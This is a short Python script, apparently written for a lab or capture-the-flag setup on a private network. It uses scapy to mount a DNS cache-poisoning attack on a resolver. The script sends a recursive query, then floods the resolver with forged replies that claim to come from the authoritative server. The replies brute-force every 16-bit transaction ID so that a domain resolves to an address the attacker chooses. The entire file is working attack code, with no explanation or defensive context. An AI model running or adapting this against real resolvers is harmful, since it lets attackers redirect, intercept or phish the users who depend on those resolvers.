#!/usr/bin/env python3

from scapy.all import DNS, DNSQR, DNSRR, Ether, IP, RandShort, UDP, sendpfast

poison = []

# first, send legit request from attacker to victim server
poison.append(Ether()/IP(src="172.16.235.4", dst="172.16.235.5")/UDP(sport=RandShort(), dport=53)/DNS(rd=1, qd=DNSQR(qname="good.pwned.tk", qtype="A")))

# poison the replies
# requests appear to be from authoritative server, destined to victim server
# brute force 16 bits of ID
for id in range(65535 + 1):
    poison.append(Ether()/IP(src="172.16.235.6", dst="172.16.235.5")/UDP(sport=53, dport=1337)/DNS(id=id, qr=1, aa=1, ra=1, qd=DNSQR(qname="good.pwned.tk", qtype="A"), an=DNSRR(rrname="good.pwned.tk", type="A", ttl=3600, rdata="127.0.0.1")))

sendpfast(poison)
